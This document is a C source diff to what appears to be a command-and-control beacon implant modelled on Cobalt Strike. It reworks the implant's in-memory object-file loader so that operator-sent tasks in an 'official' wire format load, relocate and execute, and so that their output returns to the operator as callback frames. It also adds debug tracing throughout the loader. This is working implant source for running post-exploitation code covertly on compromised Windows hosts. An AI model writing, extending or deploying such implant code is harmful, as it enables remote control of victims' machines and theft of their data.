@@ -11,6 +11,7 @@
 #include <limits.h>
 #include <stddef.h>
 #include "commands.h"
+#include "spawn_trace.h"
 #include "beacon.h"
 #include "parse.h"
 #include "inject.h"
@@ -42,6 +43,8 @@
 #define SYMBOL_BSS           1031
 
 
+static void postmsg(int type, char * msg, int len);
+
 static void postmsgf(int type, char * fmt, ...) {
 	va_list va;
 	int     est;
@@ -65,8 +68,10 @@ static void postmsgf(int type, char * fmt, ...) {
 	vsprintf_s(buff, est+1, fmt, va);
 	va_end(va);
 
-	/* post it */
-	command_shell_callback(buff, est, type);
+	/* post it - THROUGH postmsg: BeaconPrintf must honor g_obj_callback
+	 * (object-task outputs route to the operator callback as type 22);
+	 * the old direct send bypassed it and leaked task output to console */
+	postmsg(type, buff, est);
 
 	/* clear&free our memory */
 	memset(buff, 0, est);
@@ -87,7 +92,48 @@ static BOOL use_token_a(HANDLE token) {
 	return result;
 }
 
+/* callback id captured from an official BeaconObjectTask (4.9.1
+ * beacons.task_ipconfig and friends): while non-zero, object output is sent
+ * as type-22 task-callback frames ([u32 BE id][data]) so the TS routes it to
+ * the waiting operator callback instead of the beacon console */
+static int g_obj_callback = 0;
+
+/* user BOF arguments for the extended official task shape (task_cb
+ * rewrite): args4 on the wire is the callback id, the real BOF arguments
+ * ride the optional trailing length-prefixed blob. Set by the cmd100
+ * official parser, consumed by the object execution below. */
+static char * g_obj_userargs = NULL;
+static int    g_obj_userargs_len = 0;
+
+/* 2026-11-03 object-output tracing: the ipconfig result never left the
+ * beacon - log every postmsg entry + the POST queue level around the
+ * official-shape object execution (extern the queue len from the http
+ * channel) */
+extern int http_post_len;
+
 static void postmsg(int type, char * msg, int len) {
+	spawn_log("objout posted len=", (long)len);
+	if (g_obj_callback != 0) {
+		char * blob = (char *)malloc(len + 4);
+		int    id   = g_obj_callback;
+		if (blob == NULL) {
+			command_shell_callback(msg, len, type);
+			return;
+		}
+		/* BIG-endian: the TS frame parser reads the id with DataInput
+		 * readInt() (BE) - the old LE packing mismatched and either hit
+		 * "has no pending request" or silently fell into the negative-id
+		 * default branch (2026-11-03) */
+		blob[0] = (char)((id >> 24) & 0xFF);
+		blob[1] = (char)((id >> 16) & 0xFF);
+		blob[2] = (char)((id >> 8) & 0xFF);
+		blob[3] = (char)(id & 0xFF);
+		memcpy(blob + 4, msg, len);
+		command_shell_callback(blob, len + 4, 22); /* 22 = task-callback output */
+		memset(blob, 0, len + 4);
+		free(blob);
+		return;
+	}
 	command_shell_callback(msg, len, type);
 }
 
@@ -702,6 +748,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	off_bss   = (off_pdata + (SIZE_T)pdata.length + 0xFFF) & ~(SIZE_T)0xFFF;
 	total     = off_bss + (SIZE_T)bssSize;
 	if (total == 0) {
+		spawn_log("bofload fail total0", 0x7fffffff);
 		free(ftable);
 		return FALSE;
 	}
@@ -709,12 +756,14 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	/* the entry offset is wire-supplied and is executed as code_dst + entry -
 	 * it must land inside the code section we actually extracted */
 	if (entry >= (DWORD)code.length) {
+		spawn_log("bofload fail entry", (long)entry);
 		post_error_d(0x4d, (int)entry);
 		free(ftable);
 		return FALSE;
 	}
 
 	if (setting_short(SETTING_BOF_REUSE_MEMORY) && bof_cached != NULL && bof_cached_size >= total) {
+		spawn_log("bofload reuse size=", (long)bof_cached_size);
 		DWORD oldrw = 0;
 		base = bof_cached;
 		how = bof_cached_how;
@@ -731,6 +780,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		}
 		base = bof_alloc(total, &how);
 		if (base == NULL) {
+			spawn_log("bofload fail alloc total=", (long)total);
 			free(ftable);
 			return FALSE;
 		}
@@ -756,6 +806,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	if (pdata.buffer) memcpy(pdata_dst, pdata.buffer, pdata.length);
 
 	data_init(&relocsparser, relocs.buffer, relocs.length);
+	spawn_log("bofload rlen=", (long)relocsparser.length);
 	while (TRUE) {
 		char * src;
 		char * dst;
@@ -763,9 +814,12 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		int width;
 		int seclen;
 		reloc = (OBJ_RELOC *)data_ptr(&relocsparser, sizeof(OBJ_RELOC));
-		if (reloc == NULL)
+		if (reloc == NULL) {
+			spawn_log("bofload relocs exhausted plen=", (long)relocsparser.length);
 			break;
+		}
 		if (reloc->symbol == SYMBOL_END) {
+			spawn_log("bofload end reached plen=", (long)relocsparser.length);
 			success = TRUE;
 			break;
 		}
@@ -780,6 +834,13 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		/* 用减法形式避免 offset+width 的有符号回绕（offset 接近 INT_MAX 时
 		   加法回绕为负、上界比较恒假）。 */
 		if (reloc->offset < 0 || seclen < width || reloc->offset > seclen - width) {
+			/* the official BeaconObjectTask wire ships no .xdata/.pdata
+			 * content, so unwind-data relocs (sec=PDATA) arrive against an
+			 * empty section - skip them instead of failing the whole task
+			 * (interfaces.x64.o .pdata RUNTIME_FUNCTION patch sites,
+			 * 2026-11-03) */
+			if (seclen == 0)
+				continue;
 			post_error_d(0x4d, reloc->offset);
 			break;
 		}
@@ -832,6 +893,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	}
 
 	if (success) {
+		spawn_log("bofload reloc ok base=", 0x7ffffffe);
 		/* claim the pin BEFORE anything else: from here the block must
 		 * survive the load tail (no idle-RW flip, no free, no recycle) */
 		if (bof_load_pin) {
@@ -877,8 +939,10 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		perms_ok = VirtualProtect(base, (SIZE_T)(data_dst - base), codeperm, &oldp);
 		if (perms_ok && (SIZE_T)(base + total - data_dst) > 0)
 			perms_ok = VirtualProtect(data_dst, (SIZE_T)(base + total - data_dst), PAGE_READWRITE, &oldp);
-		if (!perms_ok)
+		if (!perms_ok) {
+			spawn_log("bofload perms fail gle=", (long)GetLastError());
 			post_error_d(0x11, (int)GetLastError());
+		}
 		if (perms_ok)
 			if (conv == 1) {
 				DWORD t = 0;
@@ -978,8 +1042,10 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 						}
 					}
 						else {
+							spawn_log("bofload gate exec conv=", (long)conv);
 							command_shell_callback("bofwin skipped (api/nook/threads)", 32, CALLBACK_OUTPUT);
 							inlinefunc(args, alen);
+							spawn_log("bofload gate done", 0x7ffffffe);
 						}
 #else
 				inlinefunc(args, alen);
@@ -1438,12 +1504,117 @@ cleanup:
 }
 
 void command_inline_execute_object(char * buffer, int length) {
+	spawn_log("cmd100: entry len=", (long)length);
 	datap parser;
 	datap_buffer code, relocs;
 	DWORD entry;
 	datap_buffer args;
 	int prefix_len;
 
+	/* --- 4.9.1 official BeaconObjectTask shape (beacons.task_ipconfig
+	 * and friends): [int entry][len+code][len+rdata][len+data]
+	 * [len+relocs][len+args4=callback id BE]. Discriminate by strict
+	 * full-consumption validation; fall through to BOF/PE otherwise. --- */
+	{
+		datap        p;
+		datap_buffer c491, rd491, da491, rl491, ar491;
+		DWORD        entry491;
+		BOOL         ok491 = TRUE;
+
+		data_init(&p, buffer, length);
+		entry491 = data_int(&p);
+		c491 = data_extract(&p);
+		rd491 = data_extract(&p);
+		da491 = data_extract(&p);
+		rl491 = data_extract(&p);
+		ar491 = data_extract(&p);
+		/* extended tail (2026-11-04): server-rewritten task_cb tasks carry
+		 * ONE more length-prefixed blob after args4 - the USER BOF args
+		 * (args4 itself is the server-allocated callback id). Official
+		 * tasks end at args4. Strictly: zero or one tail blob, fully
+		 * consumed. Only committed to the globals once every check passes
+		 * so a failed validation never leaks a stale tail into the next
+		 * task. */
+		{
+			datap_buffer ua491;
+			char * ua_ptr = NULL;
+			int    ua_len = 0;
+			ua491.buffer = NULL;
+			ua491.length = 0;
+			if (p.length > 0) {
+				ua491 = data_extract(&p);
+				if (ua491.buffer == NULL || p.length != 0) ok491 = FALSE;
+				else { ua_ptr = ua491.buffer; ua_len = ua491.length; }
+			}
+			if (ar491.length != 4) ok491 = FALSE;
+			if (c491.length == 0 || (DWORD)c491.length <= entry491) ok491 = FALSE;
+			if (ok491) {
+				g_obj_userargs = ua_ptr;
+				g_obj_userargs_len = ua_len;
+			}
+		}
+		/* rd/rl MAY be empty: official interfaces.x64.o has no .rdata section
+		 * at all (2026-11-03) - the old non-empty requirement made every
+		 * task_ipconfig fall into the legacy BOF path and the result never
+		 * reached the operator callback. */
+		spawn_log("cmd100 official ok491=", (long)ok491);
+		spawn_log("cmd100 uargs_len=", (long)g_obj_userargs_len);
+		spawn_log("cmd100 c_len=", (long)c491.length);
+		spawn_log("cmd100 args_len=", (long)ar491.length);
+		spawn_log("cmd100 entry=", (long)entry491);
+		spawn_log("cmd100 rd_len=", (long)rd491.length);
+		spawn_log("cmd100 rl_len=", (long)rl491.length);
+
+		if (ok491) {
+			formatp rep;
+			bformat_init(&rep, c491.length + rd491.length + da491.length
+			                   + rl491.length + 256);
+			/* BOF-runner blob shape: [int bssSize][int len][code][int len]
+			 * [rdata][int len][data][int len][xdata][int len][pdata][int len]
+			 * [relocs] - command_inline_execute_object_parsed reads exactly
+			 * bssSize + six length-prefixed extracts (entry/args arrive as
+			 * parameters). The old assembly omitted the code/rdata/data/
+			 * relocs length prefixes, so every extract misaligned and the
+			 * object never ran (rlen=0x28000000 garbage, 2026-11-03). */
+			bformat_int(&rep, 4096); /* bssSize (official task omits .bss) */
+			bformat_int(&rep, c491.length);
+			bformat_copy(&rep, (char *)c491.buffer, c491.length);
+			bformat_int(&rep, rd491.length);
+			bformat_copy(&rep, (char *)rd491.buffer, rd491.length);
+			bformat_int(&rep, da491.length);
+			bformat_copy(&rep, (char *)da491.buffer, da491.length);
+			bformat_int(&rep, 0);    /* xdata: not on the official task wire */
+			bformat_int(&rep, 0);    /* pdata: not on the official task wire */
+			bformat_int(&rep, rl491.length);
+			bformat_copy(&rep, (char *)rl491.buffer, rl491.length);
+
+			/* args blob = 4-byte callback id (BE, CommandBuilder.addInt) */
+			g_obj_callback = ((DWORD)ar491.buffer[0] << 24)
+			               | ((DWORD)ar491.buffer[1] << 16)
+			               | ((DWORD)ar491.buffer[2] << 8)
+			               | (DWORD)ar491.buffer[3];
+
+			{
+				BOOL okrun;
+				char * runargs = (g_obj_userargs != NULL) ? g_obj_userargs : ar491.buffer;
+				int    runalen = (g_obj_userargs != NULL) ? g_obj_userargs_len : ar491.length;
+				spawn_log("cmd100 preq=", (long)http_post_len);
+				okrun = command_inline_execute_object_parsed(bformat_string(&rep),
+				                                             bformat_length(&rep),
+				                                             entry491, runargs,
+				                                             runalen, 0);
+				spawn_log("cmd100 parsed ret=", (long)okrun);
+				spawn_log("cmd100 postq=", (long)http_post_len);
+			}
+			g_obj_callback = 0;
+			g_obj_userargs = NULL;
+			g_obj_userargs_len = 0;
+			bformat_free(&rep);
+			return;
+		}
+	}
+
+	/* --- legacy BOF / BOFPE shapes --- */
 	data_init(&parser, buffer, length);
 	prefix_len = data_int(&parser);  /* bssSize (BOF) / BOFPE_MAGIC (PE) */
 	code = data_extract(&parser);    /* code (BOF) / whole PE image (PE) */
